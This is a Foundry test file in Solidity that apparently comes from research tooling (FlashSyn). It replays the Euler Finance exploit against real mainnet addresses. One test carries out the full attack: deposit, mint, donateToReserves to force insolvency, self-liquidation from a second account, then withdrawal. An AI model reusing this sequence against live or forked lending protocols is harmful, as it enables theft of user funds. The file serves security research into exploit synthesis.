// SPDX-License-Identifier: MIT
pragma solidity >0.4.21;

// exploit: https://phalcon.xyz/tx/eth/0x465a6780145f1efe3ab52f94c006065575712d2003d83d85481f3d110ed131d9

import {DSTest} from "ds-test/test.sol";
import {Vm} from "forge-std/Vm.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Strings} from "mylib/StringCon.sol";
import {Collect} from "mylib/Collect.sol";



interface IUSDC {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function burn(uint256 _amount) external;
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function decimals() external view returns (uint8);
    function masterMinter() external view returns (address);
    function mint(address _to, uint256 _amount) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface IEToken {
    function burn(uint256 subAccountId, uint256 amount) external;
    function deposit(uint256 subAccountId, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function donateToReserves(uint256 subAccountId, uint256 amount) external;
    function mint(uint256 subAccountId, uint256 amount) external;
    function touch() external;
    function withdraw(uint256 subAccountId, uint256 amount) external;
}

interface IEulerProtocol {
    function dispatch() external;
    function moduleIdToImplementation(uint256 moduleId) external view returns (address);
    function moduleIdToProxy(uint256 moduleId) external view returns (address);
    function name() external view returns (string memory);
}

interface IDToken {
    function balanceOf(address account) external view returns (uint256);
}


interface ILiquidation {
    function checkLiquidation(address liquidator, address violator, address underlying, address collateral)
        external
        returns (LiquidationOpportunity memory liqOpp);
    function liquidate(address violator, address underlying, address collateral, uint256 repay, uint256 minYield)
        external;
}

struct LiquidationOpportunity {
    uint256 repay;
    uint256 yield;
    uint256 healthScore;
    // Only populated if repay > 0:
    uint256 baseDiscount;
    uint256 discount;
    uint256 conversionRate;
}

contract euler is DSTest, stdCheats {
    Vm internal constant vm = Vm(HEVM_ADDRESS);
    Collect internal collect;
    address payable constant attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
    address payable constant attacker2 = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker2"))))));
    IUSDC internal constant USDC = IUSDC(address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48));
    IEToken internal constant EToken = IEToken(address(0xbb0D4bb654a21054aF95456a3B29c63e8D1F4c0a));
    IEulerProtocol internal constant EulerProtocol = IEulerProtocol(address(0x27182842E098f60e3D576794A5bFFb0777E025d3));
    IEToken internal constant eUSDC = IEToken(address(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716));
    IDToken internal constant dUSDC = IDToken(address(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42));
    ILiquidation internal constant Liquidation = ILiquidation(address(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34));
    uint256 repay; 
    uint256 yield;
    LiquidationOpportunity temp;
    
    function setUp() public {
        collect = new Collect();
        vm.label(attacker, "Attacker");
        address MasterMinter = USDC.masterMinter();
        vm.startPrank(MasterMinter);
        USDC.configureMinter(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58), 2 ** 256 - 1);
        vm.stopPrank();
        startHoax(address(0x9BEF5148fD530244a14830f4984f2B76BCa0dC58));
        USDC.mint(address(attacker), 400000000e6);
        vm.stopPrank();

        // start to
        vm.startPrank(attacker);
        
        USDC.approve(address(EulerProtocol), type(uint256).max);
    }

    function profitSummary() public view returns (string memory) {
        string memory profitSummaryString = Strings.append("FlashSyn: ", USDC.balanceOf(address(attacker)) / 1e6);
        return profitSummaryString;
    }

    function testExample0() public {
        emit log("=================== Separator ==================");
        // Action 1: Deposit
        eUSDC.deposit(0, 1e6);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample2() public {
        eUSDC.deposit(0, 100000000e6);

        emit log("=================== Separator ==================");
        // Action2: eUSDC mint:    --> eUSDC, dUSDC
        eUSDC.mint(0, 100000000e6);

        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample3() public {
        eUSDC.deposit(0, 100000000e6);

        emit log("=================== Separator ==================");
        eUSDC.burn(0, 1000000e18);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample4() public {
        eUSDC.deposit(0, 100000000e6);

        emit log("=================== Separator ==================");
        eUSDC.donateToReserves(0, 1000000e18);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample5() public {
        emit log("=================== Separator ==================");
        eUSDC.touch();
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample6() public {
        eUSDC.deposit(0, 100000000e6);
        eUSDC.mint(0, 1600000000e6);
        eUSDC.donateToReserves(0, 1600000000e18);

        // Action 4: eUSDC liquidate:  --> USDC
        // attackerState    TokenIn eToken, dToken
        // attackerState
        emit log("=================== Separator ==================");
        vm.stopPrank();
        vm.startPrank(attacker2);
        temp = Liquidation.checkLiquidation(address(attacker2), address(attacker), address(USDC), address(USDC));
        repay = temp.repay;
        yield = temp.yield;
        Liquidation.liquidate(address(attacker), address(USDC), address(USDC), repay, yield);
        eUSDC.burn(0, type(uint256).max);
        eUSDC.withdraw(0, type(uint256).max);
        USDC.transfer(address(attacker), USDC.balanceOf(address(attacker2)));
        vm.stopPrank();
        vm.startPrank(attacker);
        emit log("=================== Separator ==================");
        revert("");
    }
}